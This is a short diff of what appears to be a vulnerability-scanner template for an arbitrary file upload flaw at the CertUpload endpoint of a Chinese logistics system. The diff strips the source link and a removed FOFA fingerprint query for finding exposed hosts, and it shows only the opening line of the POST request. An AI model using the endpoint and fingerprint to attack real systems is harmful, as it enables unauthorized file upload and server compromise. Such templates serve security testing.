@@ -3,12 +3,8 @@ info:
   name: 东胜物流 certupload 存在任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hybxivdyd50xpz8p'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hybxivdyd50xpz8p
-    fofa: body="theme/dhtmlxcombo.css"
 http:
 - raw:
   - 'POST /MsWlTruck/CertUpload HTTP/1.1
